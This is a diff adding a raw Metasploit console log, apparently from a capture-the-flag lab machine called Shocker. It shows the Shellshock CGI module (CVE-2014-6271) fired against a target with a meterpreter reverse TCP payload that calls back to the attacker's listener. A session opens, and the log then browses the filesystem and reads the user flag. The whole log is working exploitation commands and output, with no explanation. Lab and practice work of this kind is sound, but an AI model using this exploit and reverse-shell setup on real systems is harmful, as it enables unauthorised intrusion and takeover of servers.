@@ -1,1 +1,153 @@
 
+hippoeug@kali:~$ msfconsole
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT         8080             yes       The local port to listen on.
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI                        yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.10.14.6
+lhost => 10.10.14.6
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.139.89
+rhost => 10.129.139.89
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
+targeturi => /cgi-bin/user.sh
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.6:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (980808 bytes) to 10.129.139.89
+[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.129.139.89:43848) at 2021-05-02 00:33:27 +0800
+
+meterpreter > ls
+Listing: /usr/lib/cgi-bin
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  113   fil   2017-09-23 03:29:26 +0800  user.sh
+
+meterpreter > pwd
+/usr/lib/cgi-bin
+meterpreter > getuid
+Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
+meterpreter > cd ..
+meterpreter > cd ..
+meterpreter > ls
+Listing: /usr
+=============
+
+Mode             Size   Type  Last modified              Name
+----             ----   ----  -------------              ----
+40755/rwxr-xr-x  20480  dir   2017-09-23 03:21:53 +0800  bin
+40755/rwxr-xr-x  4096   dir   2017-09-23 00:28:20 +0800  games
+40755/rwxr-xr-x  4096   dir   2017-09-23 00:41:02 +0800  include
+40755/rwxr-xr-x  4096   dir   2017-09-23 02:11:25 +0800  lib
+40755/rwxr-xr-x  4096   dir   2017-09-23 00:28:22 +0800  local
+40755/rwxr-xr-x  4096   dir   2017-09-23 02:11:25 +0800  sbin
+40755/rwxr-xr-x  4096   dir   2017-09-23 02:11:25 +0800  share
+40755/rwxr-xr-x  4096   dir   2017-09-23 00:43:51 +0800  src
+
+meterpreter > cd ..
+meterpreter > ls
+
+Listing: /
+==========
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+40755/rwxr-xr-x   12288     dir   2017-09-23 03:21:53 +0800  bin
+40755/rwxr-xr-x   1024      dir   2017-09-23 00:44:21 +0800  boot
+40755/rwxr-xr-x   3880      dir   2021-05-01 20:16:42 +0800  dev
+40755/rwxr-xr-x   4096      dir   2017-09-23 03:55:57 +0800  etc
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:33:54 +0800  home
+100644/rw-r--r--  37862620  fil   2017-09-23 00:44:21 +0800  initrd.img
+100644/rw-r--r--  37295736  fil   2017-09-23 00:42:19 +0800  initrd.img.old
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:40:50 +0800  lib
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:40:40 +0800  lib64
+40700/rwx------   16384     dir   2017-09-23 00:28:16 +0800  lost+found
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:28:25 +0800  media
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:28:19 +0800  mnt
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:28:19 +0800  opt
+40555/r-xr-xr-x   0         dir   2021-05-01 20:16:34 +0800  proc
+40700/rwx------   4096      dir   2017-09-23 03:36:53 +0800  root
+40755/rwxr-xr-x   860       dir   2021-05-01 20:16:50 +0800  run
+40755/rwxr-xr-x   12288     dir   2017-09-23 00:41:20 +0800  sbin
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:31:51 +0800  snap
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:28:19 +0800  srv
+40555/r-xr-xr-x   0         dir   2021-05-01 20:16:36 +0800  sys
+41777/rwxrwxrwx   4096      dir   2021-05-02 00:33:42 +0800  tmp
+40755/rwxr-xr-x   4096      dir   2017-09-23 00:28:24 +0800  usr
+40755/rwxr-xr-x   4096      dir   2017-09-23 02:11:25 +0800  var
+100600/rw-------  7101968   fil   2017-09-23 00:43:36 +0800  vmlinuz
+100600/rw-------  7047504   fil   2017-09-23 00:28:43 +0800  vmlinuz.old
+
+meterpreter > 
+meterpreter > cd home
+meterpreter > ls
+Listing: /home
+==============
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40755/rwxr-xr-x  4096  dir   2017-09-23 03:49:12 +0800  shelly
+
+meterpreter > cd selly
+[-] stdapi_fs_chdir: Operation failed: 2
+meterpreter > cd shelly
+meterpreter > ls
+Listing: /home/shelly
+=====================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100600/rw-------  0     fil   2017-12-25 03:44:05 +0800  .bash_history
+100644/rw-r--r--  220   fil   2017-09-23 00:33:54 +0800  .bash_logout
+100644/rw-r--r--  3771  fil   2017-09-23 00:33:54 +0800  .bashrc
+40700/rwx------   4096  dir   2017-09-23 00:35:28 +0800  .cache
+40775/rwxrwxr-x   4096  dir   2017-09-23 03:49:12 +0800  .nano
+100644/rw-r--r--  655   fil   2017-09-23 00:33:54 +0800  .profile
+100644/rw-r--r--  66    fil   2017-09-23 03:43:04 +0800  .selected_editor
+100644/rw-r--r--  0     fil   2017-09-23 00:35:31 +0800  .sudo_as_admin_successful
+100444/r--r--r--  33    fil   2021-05-01 20:17:02 +0800  user.txt
+
+meterpreter > pwd
+/home/shelly
+meterpreter > cat user.txt
+269772aeb3c671e933017e412063eab9
+meterpreter > 
